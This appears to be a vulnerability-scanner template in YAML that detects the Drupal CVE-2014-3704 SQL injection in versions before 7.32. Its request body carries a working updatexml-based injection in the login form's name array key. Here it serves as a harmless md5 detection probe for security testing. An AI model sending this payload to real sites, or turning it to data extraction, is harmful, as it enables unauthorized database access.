name: poc-yaml-drupal-cve-2014-3704-sqli
manual: true
transport: http
set:
    rand: randomInt(200000000, 210000000)
rules:
    r0:
        request:
            method: POST
            path: /?q=node&destination=node
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,(select md5({{rand}}))),0)%23]=bob&name[0]=a
        expression: response.status == 500 && response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
expression: r0()
detail:
    links:
        - https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2014-3704
    Affected Version: Drupal < 7.32
